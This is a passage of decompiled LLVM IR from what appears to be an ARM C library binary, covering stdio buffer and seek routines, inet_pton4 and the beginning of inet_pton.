  br i1 %v2_1cae8, label %.thread1, label %bb13

.thread1:                                         ; preds = %dec_label_pc_1cae0
  %v1_1caf03 = sub nsw i32 0, %v5_1cae4
  br label %bb14

bb13:                                             ; preds = %dec_label_pc_1cae0
  %v3_1caec = add i32 %tmp, 2
  %v4_1caec = inttoptr i32 %v3_1caec to i8*
  %v5_1caec = load i8, i8* %v4_1caec, align 1
  %v6_1caec = zext i8 %v5_1caec to i32
  store i32 %v6_1caec, i32* %r3.global-to-local, align 4
  %sum = add nuw nsw i32 %v6_1caec, %v5_1cae4
  %v3_1caf4 = sub nsw i32 0, %sum
  br label %bb14

bb14:                                             ; preds = %bb, %.thread1, %dec_label_pc_1cac4, %dec_label_pc_1cabc, %bb13
  %v1_1cb08 = phi i32 [ %v1_1caf03, %.thread1 ], [ %v1_1cabc, %dec_label_pc_1cac4 ], [ %v1_1cabc, %dec_label_pc_1cabc ], [ 0, %bb ], [ %v3_1caf4, %bb13 ]
  %v1_1caf8 = and i32 %v4_1caa4, 64
  %v2_1caf8 = icmp eq i32 %v1_1caf8, 0
  %v2_1cafc = add i32 %tmp, 16
  %v3_1cafc = inttoptr i32 %v2_1cafc to i32*
  %v4_1cafc = load i32, i32* %v3_1cafc, align 4
  store i32 %v4_1cafc, i32* %r3.global-to-local, align 4
  %storemerge.in.in.v = select i1 %v2_1caf8, i32 20, i32 8
  %storemerge.in.in = add i32 %storemerge.in.in.v, %tmp
  %storemerge.in = inttoptr i32 %storemerge.in.in to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v2_1cb08 = sub i32 %v1_1cb08, %v4_1cafc
  store i32 %v2_1cb08, i32* %r3.global-to-local, align 4
  %v1_1cb0c = inttoptr i32 %arg2 to i32*
  %v2_1cb0c = load i32, i32* %v1_1cb0c, align 4
  store i32 %v2_1cb0c, i32* %r0.global-to-local, align 4
  %v3_1cb0c = add i32 %arg2, 4
  %v4_1cb0c = inttoptr i32 %v3_1cb0c to i32*
  %v5_1cb0c = load i32, i32* %v4_1cb0c, align 4
  %v2_1cb10 = add i32 %storemerge, %v2_1cb08
  store i32 %v2_1cb10, i32* %r4.global-to-local, align 4
  %v2_1cb14 = sub i32 %v2_1cb0c, %v2_1cb10
  store i32 %v2_1cb14, i32* %r2.global-to-local, align 4
  %v2_1cb18 = and i32 %v2_1cb10, 1073741824
  %v3_1cb18 = icmp ne i32 %v2_1cb18, 0
  %v4_1cb18 = ashr i32 %v2_1cb10, 31
  %v6_1cb18 = icmp eq i1 %v3_1cb18, false
  %v7_1cb18 = sub i32 %v5_1cb0c, %v4_1cb18
  %v9_1cb18 = sext i1 %v6_1cb18 to i32
  %v10_1cb18 = add i32 %v7_1cb18, %v9_1cb18
  store i32 %v10_1cb18, i32* %r3.global-to-local, align 4
  %v2_1cb1c = sub i32 %v10_1cb18, %v5_1cb0c
  %v4_1cb1c = xor i32 %v10_1cb18, %v5_1cb0c
  %v5_1cb1c = xor i32 %v2_1cb1c, %v10_1cb18
  %v6_1cb1c = and i32 %v5_1cb1c, %v4_1cb1c
  %v7_1cb1c = icmp slt i32 %v6_1cb1c, 0
  %v8_1cb1c = icmp slt i32 %v2_1cb1c, 0
  %v9_1cb1c = icmp eq i32 %v10_1cb18, %v5_1cb0c
  store i32 %v2_1cb14, i32* %v1_1cb0c, align 4
  %v5_1cb20 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v5_1cb20, i32* %v4_1cb0c, align 4
  %v3_1cb24 = xor i1 %v8_1cb1c, %v7_1cb1c
  %v4_1cb24 = or i1 %v9_1cb1c, %v3_1cb24
  br i1 %v4_1cb24, label %dec_label_pc_1cb28, label %dec_label_pc_1cb34

dec_label_pc_1cb28:                               ; preds = %bb14
  br i1 %v9_1cb1c, label %dec_label_pc_1cb2c, label %dec_label_pc_1cb38thread-pre-split

dec_label_pc_1cb2c:                               ; preds = %dec_label_pc_1cb28
  %v0_1cb2c = load i32, i32* %r2.global-to-local, align 4
  %v1_1cb2c = load i32, i32* %r0.global-to-local, align 4
  %tmp18 = icmp ugt i32 %v0_1cb2c, %v1_1cb2c
  br i1 %tmp18, label %dec_label_pc_1cb34, label %dec_label_pc_1cb38thread-pre-split

dec_label_pc_1cb34:                               ; preds = %dec_label_pc_1cb2c, %bb14
  %v0_1cb34 = load i32, i32* %r4.global-to-local, align 4
  %v1_1cb34 = sub i32 0, %v0_1cb34
  store i32 %v1_1cb34, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1cb38

dec_label_pc_1cb38thread-pre-split:               ; preds = %dec_label_pc_1cb2c, %dec_label_pc_1cb28
  %v0_1cb38.pr = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1cb38

dec_label_pc_1cb38:                               ; preds = %dec_label_pc_1cb38thread-pre-split, %dec_label_pc_1cb34
  %v0_1cb38 = phi i32 [ %v0_1cb38.pr, %dec_label_pc_1cb38thread-pre-split ], [ %v1_1cb34, %dec_label_pc_1cb34 ]
  %v1_1cb38 = icmp slt i32 %v0_1cb38, 0
  br i1 %v1_1cb38, label %dec_label_pc_1cb40, label %dec_label_pc_1cb54

dec_label_pc_1cb40:                               ; preds = %dec_label_pc_1cb38
  %v0_1cb40 = call i32 @__GI___errno_location()
  store i32 %v0_1cb40, i32* %r0.global-to-local, align 4
  store i32 75, i32* %r3.global-to-local, align 4
  %v2_1cb48 = inttoptr i32 %v0_1cb40 to i32*
  store i32 75, i32* %v2_1cb48, align 4
  %v0_1cb54.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1cb54

dec_label_pc_1cb50:                               ; preds = %dec_label_pc_1cad4, %dec_label_pc_1cacc
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1cb54

dec_label_pc_1cb54:                               ; preds = %dec_label_pc_1cb38, %dec_label_pc_1cb40, %dec_label_pc_1cb50
  %v0_1cb54 = phi i32 [ %v0_1cb38, %dec_label_pc_1cb38 ], [ %v0_1cb54.pre, %dec_label_pc_1cb40 ], [ -1, %dec_label_pc_1cb50 ]
  store i32 %v0_1cb54, i32* %r0.global-to-local, align 4
  %v2_1cb5c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_1cb5c, i32* @r4, align 4
  ret i32 %v0_1cb54

; uselistorder directives
  uselistorder i32 %v0_1cb54, { 1, 0 }
  uselistorder i1 %v9_1cb1c, { 1, 0 }
  uselistorder i32 %v2_1cb1c, { 1, 0 }
  uselistorder i32 %v10_1cb18, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v5_1cb0c, { 2, 0, 1, 3 }
  uselistorder i32 %tmp, { 0, 5, 1, 3, 2, 4, 6 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 3, 1, 4, 5 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 0, 3, 4 }
  uselistorder i32* %r0.global-to-local, { 1, 4, 2, 3, 0 }
  uselistorder i32 75, { 0, 3, 1, 2 }
  uselistorder i16 4, { 2, 0, 1, 3 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_1cb54, { 2, 1, 0 }
  uselistorder label %bb14, { 4, 1, 2, 3, 0 }
}

define i32 @__stdio_rfill(i32 %arg1) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1cb64 = load i32, i32* @r4, align 4
  store i32 %v3_1cb64, i32* %stack_var_-8, align 4
  %v1_1cb68 = add i32 %arg1, 8
  %v1_1cb6c = inttoptr i32 %v1_1cb68 to i32*
  %v2_1cb6c = load i32, i32* %v1_1cb6c, align 4
  %v3_1cb6c = add i32 %arg1, 12
  %v4_1cb6c = inttoptr i32 %v3_1cb6c to i32*
  %v5_1cb6c = load i32, i32* %v4_1cb6c, align 4
  %v2_1cb70 = sub i32 %v5_1cb6c, %v2_1cb6c
  store i32 %v2_1cb70, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* @r4, align 4
  %v3_1cb78 = inttoptr i32 %arg1 to i16*
  %v4_1cb78 = call i32 @__stdio_READ(i16* %v3_1cb78, i32 %v2_1cb6c, i32 %v2_1cb70)
  %v0_1cb7c = load i32, i32* @r4, align 4
  %v1_1cb7c = add i32 %v0_1cb7c, 8
  %v2_1cb7c = inttoptr i32 %v1_1cb7c to i32*
  %v3_1cb7c = load i32, i32* %v2_1cb7c, align 4
  store i32 %v3_1cb7c, i32* %r2.global-to-local, align 4
  %v2_1cb80 = add i32 %v3_1cb7c, %v4_1cb78
  %v2_1cb84 = add i32 %v0_1cb7c, 20
  %v3_1cb84 = inttoptr i32 %v2_1cb84 to i32*
  store i32 %v2_1cb80, i32* %v3_1cb84, align 4
  %v0_1cb88 = load i32, i32* %r2.global-to-local, align 4
  %v1_1cb88 = load i32, i32* @r4, align 4
  %v2_1cb88 = add i32 %v1_1cb88, 16
  %v3_1cb88 = inttoptr i32 %v2_1cb88 to i32*
  store i32 %v0_1cb88, i32* %v3_1cb88, align 4
  %v2_1cb8c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1cb8c, i32* @r4, align 4
  ret i32 %v4_1cb78

; uselistorder directives
  uselistorder i32 %v4_1cb78, { 1, 0 }
  uselistorder i32 %arg1, { 3, 2, 1, 0 }
}

define i32 @__stdio_trans2r_o() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_1cb94 = load i32, i32* @r4, align 4
  store i32 %v3_1cb94, i32* %stack_var_-12, align 4
  %v0_1cb98 = load i32, i32* @r0, align 4
  %v1_1cb98 = inttoptr i32 %v0_1cb98 to i16*
  %v2_1cb98 = load i16, i16* %v1_1cb98, align 2
  %v3_1cb98 = zext i16 %v2_1cb98 to i32
  store i32 %v3_1cb98, i32* %r3.global-to-local, align 4
  %v0_1cb9c = load i32, i32* @r1, align 4
  %v2_1cb9c = and i32 %v0_1cb9c, %v3_1cb98
  %v4_1cb9c = icmp eq i32 %v2_1cb9c, 0
  store i32 %v0_1cb98, i32* @r4, align 4
  br i1 %v4_1cb9c, label %dec_label_pc_1cbac, label %dec_label_pc_1cbbc

dec_label_pc_1cbac:                               ; preds = %entry
  %v1_1cbac = and i32 %v3_1cb98, 2176
  %v2_1cbac = icmp eq i32 %v1_1cbac, 0
  br i1 %v2_1cbac, label %dec_label_pc_1cbb4, label %dec_label_pc_1cbc8

dec_label_pc_1cbb4:                               ; preds = %dec_label_pc_1cbac
  %v2_1cbb4 = or i32 %v0_1cb9c, %v3_1cb98
  store i32 %v2_1cbb4, i32* %r3.global-to-local, align 4
  %v1_1cbb8 = trunc i32 %v2_1cbb4 to i16
  store i16 %v1_1cbb8, i16* %v1_1cb98, align 2
  %v0_1cbbc.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1cbbc

dec_label_pc_1cbbc:                               ; preds = %entry, %dec_label_pc_1cbb4
  %v0_1cbbc = phi i32 [ %v0_1cb98, %entry ], [ %v0_1cbbc.pre, %dec_label_pc_1cbb4 ]
  %v1_1cbbc = inttoptr i32 %v0_1cbbc to i16*
  %v2_1cbbc = load i16, i16* %v1_1cbbc, align 2
  %v3_1cbbc = zext i16 %v2_1cbbc to i32
  store i32 %v3_1cbbc, i32* %r3.global-to-local, align 4
  %v1_1cbc0 = and i32 %v3_1cbbc, 16
  store i32 %v1_1cbc0, i32* %r5.global-to-local, align 4
  %v2_1cbc0 = icmp eq i32 %v1_1cbc0, 0
  br i1 %v2_1cbc0, label %dec_label_pc_1cbe8, label %dec_label_pc_1cbc8

dec_label_pc_1cbc8:                               ; preds = %dec_label_pc_1cbac, %dec_label_pc_1cbbc
  %v0_1cbc8 = call i32 @__GI___errno_location()
  store i32 %v0_1cbc8, i32* %r0.global-to-local, align 4
  store i32 9, i32* %r3.global-to-local, align 4
  %v2_1cbd0 = inttoptr i32 %v0_1cbc8 to i32*
  store i32 9, i32* %v2_1cbd0, align 4
  br label %dec_label_pc_1cbd4

dec_label_pc_1cbd4:                               ; preds = %dec_label_pc_1cbf0, %dec_label_pc_1cbc8
  %v0_1cbd4 = load i32, i32* @r4, align 4
  %v1_1cbd4 = inttoptr i32 %v0_1cbd4 to i16*
  %v2_1cbd4 = load i16, i16* %v1_1cbd4, align 2
  %v3_1cbd4 = zext i16 %v2_1cbd4 to i32
  store i32 -1, i32* %r0.global-to-local, align 4
  %v1_1cbdc = or i32 %v3_1cbd4, 8
  store i32 %v1_1cbdc, i32* %r3.global-to-local, align 4
  %v1_1cbe0 = trunc i32 %v1_1cbdc to i16
  store i16 %v1_1cbe0, i16* %v1_1cbd4, align 2
  %v1_1cc28.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1cc20

dec_label_pc_1cbe8:                               ; preds = %dec_label_pc_1cbbc
  %v1_1cbe8 = and i32 %v3_1cbbc, 64
  %v2_1cbe8 = icmp eq i32 %v1_1cbe8, 0
  br i1 %v2_1cbe8, label %dec_label_pc_1cc10, label %dec_label_pc_1cbf0

dec_label_pc_1cbf0:                               ; preds = %dec_label_pc_1cbe8
  %v0_1cbf0 = call i32 @__stdio_wcommit()
  store i32 %v0_1cbf0, i32* %r0.global-to-local, align 4
  %v2_1cbf4 = icmp eq i32 %v0_1cbf0, 0
  br i1 %v2_1cbf4, label %dec_label_pc_1cbfc, label %dec_label_pc_1cbd4

dec_label_pc_1cbfc:                               ; preds = %dec_label_pc_1cbf0
  %v0_1cbfc = load i32, i32* @r4, align 4
  %v1_1cbfc = inttoptr i32 %v0_1cbfc to i16*
  %v2_1cbfc = load i16, i16* %v1_1cbfc, align 2
  %v3_1cbfc = zext i16 %v2_1cbfc to i32
  store i32 %v3_1cbfc, i32* %r3.global-to-local, align 4
  %v1_1cc00 = add i32 %v0_1cbfc, 8
  %v2_1cc00 = inttoptr i32 %v1_1cc00 to i32*
  %v3_1cc00 = load i32, i32* %v2_1cc00, align 4
  %v1_1cc04 = and i32 %v3_1cbfc, 65471
  store i32 %v1_1cc04, i32* %r3.global-to-local, align 4
  %v2_1cc08 = add i32 %v0_1cbfc, 28
  %v3_1cc08 = inttoptr i32 %v2_1cc08 to i32*
  store i32 %v3_1cc00, i32* %v3_1cc08, align 4
  %v0_1cc0c = load i32, i32* %r3.global-to-local, align 4
  %v1_1cc0c = trunc i32 %v0_1cc0c to i16
  %v2_1cc0c = load i32, i32* @r4, align 4
  %v3_1cc0c = inttoptr i32 %v2_1cc0c to i16*
  store i16 %v1_1cc0c, i16* %v3_1cc0c, align 2
  %v0_1cc10.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1cc10

dec_label_pc_1cc10:                               ; preds = %dec_label_pc_1cbe8, %dec_label_pc_1cbfc
  %v2_1cc18 = phi i32 [ %v0_1cbbc, %dec_label_pc_1cbe8 ], [ %v0_1cc10.pre, %dec_label_pc_1cbfc ]
  %v1_1cc10 = inttoptr i32 %v2_1cc18 to i16*
  %v2_1cc10 = load i16, i16* %v1_1cc10, align 2
  %v3_1cc10 = zext i16 %v2_1cc10 to i32
  %v1_1cc14 = or i32 %v3_1cc10, 1
  store i32 %v1_1cc14, i32* %r3.global-to-local, align 4
  %v1_1cc18 = trunc i32 %v1_1cc14 to i16
  store i16 %v1_1cc18, i16* %v1_1cc10, align 2
  %v0_1cc1c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_1cc1c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1cc20

dec_label_pc_1cc20:                               ; preds = %dec_label_pc_1cbd4, %dec_label_pc_1cc10
  %v1_1cc28 = phi i32 [ %v1_1cc28.pre, %dec_label_pc_1cbd4 ], [ %v0_1cc1c, %dec_label_pc_1cc10 ]
  %v2_1cc24 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_1cc24, i32* @r4, align 4
  ret i32 %v1_1cc28

; uselistorder directives
  uselistorder i32 %v3_1cb98, { 0, 2, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 0, 3, 1, 2, 4 }
  uselistorder i32 65471, { 2, 1, 0 }
  uselistorder i32 ()* @__stdio_wcommit, { 5, 2, 4, 3, 1, 0 }
  uselistorder label %dec_label_pc_1cc20, { 1, 0 }
  uselistorder label %dec_label_pc_1cc10, { 1, 0 }
  uselistorder label %dec_label_pc_1cbc8, { 1, 0 }
  uselistorder label %dec_label_pc_1cbbc, { 1, 0 }
}

define i32 @__stdio_seek(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg2 to i32
  %v2_1cc38 = load i32, i32* %arg2, align 4
  %v3_1cc38 = add i32 %tmp, 4
  %v4_1cc38 = inttoptr i32 %v3_1cc38 to i32*
  %v5_1cc38 = load i32, i32* %v4_1cc38, align 4
  %v1_1cc3c = add i32 %arg1, 4
  %v2_1cc3c = inttoptr i32 %v1_1cc3c to i32*
  %v3_1cc3c = load i32, i32* %v2_1cc3c, align 4
  store i32 %tmp, i32* @r4, align 4
  %v4_1cc44 = call i32 @__GI_lseek64(i32 %v3_1cc3c, i32 %tmp, i32 %v2_1cc38, i32 %v5_1cc38)
  %v1_1cc48 = icmp slt i32* %arg2, null
  br i1 %v1_1cc48, label %bb13, label %bb

bb:                                               ; preds = %entry
  %v3_1cc505 = load i32, i32* @r4, align 4
  %v4_1cc506 = inttoptr i32 %v3_1cc505 to i32*
  store i32 %v4_1cc44, i32* %v4_1cc506, align 4
  %v6_1cc507 = add i32 %v3_1cc505, 4
  %v7_1cc508 = inttoptr i32 %v6_1cc507 to i32*
  store i32 %tmp, i32* %v7_1cc508, align 4
  br label %bb13

bb13:                                             ; preds = %entry, %bb
  %storemerge = phi i32 [ 0, %bb ], [ %v4_1cc44, %entry ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %tmp, { 0, 3, 2, 1 }
  uselistorder i32* null, { 2, 3, 0, 4, 1, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 17, 18, 16, 19, 20, 21, 22, 23, 24, 30, 31, 28, 29, 27, 26, 25, 32, 33, 34, 5 }
  uselistorder label %bb13, { 1, 0 }
}

define i32 @inet_pton4(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r1.global-to-local, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_1cc68 = load i32, i32* @r4, align 4
  %v6_1cc68 = load i32, i32* @r5, align 4
  %v15_1cc68 = load i32, i32* @lr, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 0, i32* @ip, align 4
  store i32 0, i32* @lr, align 4
  %v2_1cc80 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_1cc80, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 10, i32* %r7.global-to-local, align 4
  store i32 1, i32* %r6.global-to-local, align 4
  store i32 0, i32* %stack_var_-28, align 4
  %v0_1ccf81 = load i32, i32* @r0, align 4
  %v1_1ccf82 = inttoptr i32 %v0_1ccf81 to i8*
  %v2_1ccf83 = load i8, i8* %v1_1ccf82, align 1
  %v3_1ccf84 = zext i8 %v2_1ccf83 to i32
  store i32 %v3_1ccf84, i32* @r3, align 4
  %v2_1ccfc5 = icmp eq i8 %v2_1ccf83, 0
  store i1 %v2_1ccfc5, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1ccfc5, label %dec_label_pc_1cd08, label %dec_label_pc_1cc98

dec_label_pc_1cc98:                               ; preds = %entry, %dec_label_pc_1ccf8.backedge
  %v0_1cc9c = phi i32 [ %v0_1ccf8, %dec_label_pc_1ccf8.backedge ], [ %v0_1ccf81, %entry ]
  %v0_1ccd4 = phi i32 [ %v3_1ccf8, %dec_label_pc_1ccf8.backedge ], [ %v3_1ccf84, %entry ]
  %v2_1cca8.in = phi i32 [ %v3_1ccf8, %dec_label_pc_1ccf8.backedge ], [ %v3_1ccf84, %entry ]
  %v2_1cca8 = add nsw i32 %v2_1cca8.in, -48
  %v2_1cc98 = icmp ugt i32 %v2_1cca8, 8
  %v7_1cc98 = icmp eq i32 %v2_1cca8, 9
  store i1 %v7_1cc98, i1* %cpsr_z.global-to-local, align 1
  %v1_1cc9c = add i32 %v0_1cc9c, 1
  store i32 %v1_1cc9c, i32* %r0.global-to-local, align 4
  %v2_1cca0 = xor i1 %v7_1cc98, true
  %v3_1cca0 = and i1 %v2_1cc98, %v2_1cca0
  br i1 %v3_1cca0, label %dec_label_pc_1ccd4, label %dec_label_pc_1cca4

dec_label_pc_1cca4:                               ; preds = %dec_label_pc_1cc98
  %v0_1cca4 = load i32, i32* %r1.global-to-local, align 4
  %v1_1cca4 = inttoptr i32 %v0_1cca4 to i8*
  %v2_1cca4 = load i8, i8* %v1_1cca4, align 1
  %v3_1cca4 = zext i8 %v2_1cca4 to i32
  %v0_1cca8 = load i32, i32* %r7.global-to-local, align 4
  %v3_1cca8 = mul i32 %v0_1cca8, %v3_1cca4
  %v4_1cca8 = add i32 %v3_1cca8, %v2_1cca8
  store i32 %v4_1cca8, i32* @r3, align 4
  %v2_1ccac = icmp ugt i32 %v4_1cca8, 254
  %v7_1ccac = icmp eq i32 %v4_1cca8, 255
  store i1 %v7_1ccac, i1* %cpsr_z.global-to-local, align 1
  %v2_1ccb0 = xor i1 %v7_1ccac, true
  %v3_1ccb0 = and i1 %v2_1ccac, %v2_1ccb0
  br i1 %v3_1ccb0, label %dec_label_pc_1cd2c, label %dec_label_pc_1ccb4

dec_label_pc_1ccb4:                               ; preds = %dec_label_pc_1cca4
  %v0_1ccb4 = load i32, i32* @lr, align 4
  %v2_1ccb4 = icmp eq i32 %v0_1ccb4, 0
  store i1 %v2_1ccb4, i1* %cpsr_z.global-to-local, align 1
  %v1_1ccb8 = trunc i32 %v4_1cca8 to i8
  store i8 %v1_1ccb8, i8* %v1_1cca4, align 1
  %v0_1ccbc = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1ccbc, label %dec_label_pc_1ccc0, label %dec_label_pc_1ccf8.backedge

dec_label_pc_1ccc0:                               ; preds = %dec_label_pc_1ccb4
  %v0_1ccc0 = load i32, i32* @ip, align 4
  %v1_1ccc0 = add i32 %v0_1ccc0, 1
  store i32 %v1_1ccc0, i32* @ip, align 4
  %v7_1ccc4 = icmp eq i32 %v1_1ccc0, 4
  store i1 %v7_1ccc4, i1* %cpsr_z.global-to-local, align 1
  %v0_1ccc8 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_1ccc8, i32* @lr, align 4
  %v8_1cccc = icmp sgt i32 %v1_1ccc0, 4
  br i1 %v8_1cccc, label %dec_label_pc_1cd2c, label %dec_label_pc_1ccf8.backedge

dec_label_pc_1ccd4:                               ; preds = %dec_label_pc_1cc98
  %v7_1ccd4 = icmp eq i32 %v0_1ccd4, 46
  %v1_1ccdc = load i32, i32* @lr, align 4
  %v2_1ccdc = urem i32 %v1_1ccdc, 2
  %storemerge12 = select i1 %v7_1ccd4, i32 %v2_1ccdc, i32 0
  store i32 %storemerge12, i32* @r3, align 4
  %v2_1cce0 = icmp eq i32 %storemerge12, 0
  store i1 %v2_1cce0, i1* %cpsr_z.global-to-local, align 1
  %v0_1cce4 = load i32, i32* @r5, align 4
  store i32 %v0_1cce4, i32* @lr, align 4
  br i1 %v2_1cce0, label %dec_label_pc_1cd2c, label %dec_label_pc_1ccec

dec_label_pc_1ccec:                               ; preds = %dec_label_pc_1ccd4
  %v0_1ccec = load i32, i32* @ip, align 4
  %v7_1ccec = icmp eq i32 %v0_1ccec, 4
  store i1 %v7_1ccec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1ccec, label %dec_label_pc_1cd2c, label %dec_label_pc_1ccf4

dec_label_pc_1ccf4:                               ; preds = %dec_label_pc_1ccec
  %v1_1ccf4 = trunc i32 %v0_1cce4 to i8
  %v2_1ccf4 = load i32, i32* %r1.global-to-local, align 4
  %v3_1ccf4 = add i32 %v2_1ccf4, 1
  %v4_1ccf4 = inttoptr i32 %v3_1ccf4 to i8*
  store i8 %v1_1ccf4, i8* %v4_1ccf4, align 1
  %v5_1ccf4 = load i32, i32* %r1.global-to-local, align 4
  %v6_1ccf4 = add i32 %v5_1ccf4, 1
  store i32 %v6_1ccf4, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1ccf8.backedge

dec_label_pc_1ccf8.backedge:                      ; preds = %dec_label_pc_1ccf4, %dec_label_pc_1ccb4, %dec_label_pc_1ccc0
  %v0_1ccf8 = load i32, i32* %r0.global-to-local, align 4
  %v1_1ccf8 = inttoptr i32 %v0_1ccf8 to i8*
  %v2_1ccf8 = load i8, i8* %v1_1ccf8, align 1
  %v3_1ccf8 = zext i8 %v2_1ccf8 to i32
  store i32 %v3_1ccf8, i32* @r3, align 4
  %v2_1ccfc = icmp eq i8 %v2_1ccf8, 0
  store i1 %v2_1ccfc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1ccfc, label %dec_label_pc_1ccf8.dec_label_pc_1cd08_crit_edge, label %dec_label_pc_1cc98

dec_label_pc_1ccf8.dec_label_pc_1cd08_crit_edge:  ; preds = %dec_label_pc_1ccf8.backedge
  %v0_1cd08.pre = load i32, i32* @ip, align 4
  br label %dec_label_pc_1cd08

dec_label_pc_1cd08:                               ; preds = %dec_label_pc_1ccf8.dec_label_pc_1cd08_crit_edge, %entry
  %v0_1cd08 = phi i32 [ %v0_1cd08.pre, %dec_label_pc_1ccf8.dec_label_pc_1cd08_crit_edge ], [ 0, %entry ]
  %v7_1cd08 = icmp eq i32 %v0_1cd08, 3
  store i1 %v7_1cd08, i1* %cpsr_z.global-to-local, align 1
  %v7_1cd0c = icmp slt i32 %v0_1cd08, 4
  br i1 %v7_1cd0c, label %dec_label_pc_1cd2c, label %dec_label_pc_1cd10

dec_label_pc_1cd10:                               ; preds = %dec_label_pc_1cd08
  %v0_1cd10 = load i32, i32* @r4, align 4
  store i32 %v0_1cd10, i32* @r0, align 4
  store i32 %v2_1cc80, i32* @r1, align 4
  store i32 4, i32* @r2, align 4
  %v0_1cd1c = call i32 @memcpy()
  br label %dec_label_pc_1cd2c

dec_label_pc_1cd2c:                               ; preds = %dec_label_pc_1cca4, %dec_label_pc_1ccc0, %dec_label_pc_1ccd4, %dec_label_pc_1ccec, %dec_label_pc_1cd08, %dec_label_pc_1cd10
  %storemerge = phi i32 [ 1, %dec_label_pc_1cd10 ], [ 0, %dec_label_pc_1cd08 ], [ 0, %dec_label_pc_1ccec ], [ 0, %dec_label_pc_1ccd4 ], [ 0, %dec_label_pc_1ccc0 ], [ 0, %dec_label_pc_1cca4 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  store i32 %v3_1cc68, i32* @r4, align 4
  store i32 %v6_1cc68, i32* @r5, align 4
  store i32 %v15_1cc68, i32* @lr, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_1cd08, { 1, 0 }
  uselistorder i32 %v3_1ccf8, { 2, 1, 0 }
  uselistorder i32 %v0_1ccf8, { 1, 0 }
  uselistorder i32 %storemerge12, { 1, 0 }
  uselistorder i32 %v2_1cca8, { 2, 0, 1 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 8, 1, 2, 3, 4, 5, 6, 7, 9 }
  uselistorder label %dec_label_pc_1cd2c, { 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_1ccf8.backedge, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1cc98, { 1, 0 }
}

define i32 @inet_pton(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %v3_1cd38 = load i32, i32* @r4, align 4
  %v6_1cd38 = load i32, i32* @r5, align 4
  %v9_1cd38 = load i32, i32* @r6, align 4
  %v12_1cd38 = load i32, i32* @r7, align 4
  %v27_1cd38 = load i32, i32* @lr, align 4
  %v7_1cd44 = icmp eq i32 %arg1, 2
  store i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32* @r4, align 4
  store i32 %tmp, i32* @r5, align 4
  br i1 %v7_1cd44, label %dec_label_pc_1cd64, label %dec_label_pc_1cd58

dec_label_pc_1cd58:                               ; preds = %entry
  %v7_1cd58 = icmp eq i32 %arg1, 10
  br i1 %v7_1cd58, label %dec_label_pc_1cd74, label %dec_label_pc_1cf2c

dec_label_pc_1cd64:                               ; preds = %entry
  store i32 %tmp, i32* @r0, align 4
  store i32 %arg3, i32* %r1.global-to-local, align 4
  %v3_1cd6c = call i32 @inet_pton4(i32 %tmp, i32 %arg3)
  br label %dec_label_pc_1cf3c

dec_label_pc_1cd74:                               ; preds = %dec_label_pc_1cd58
  %v2_1cd74 = ptrtoint i32* %stack_var_-56 to i32
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 16, i32* @r2, align 4
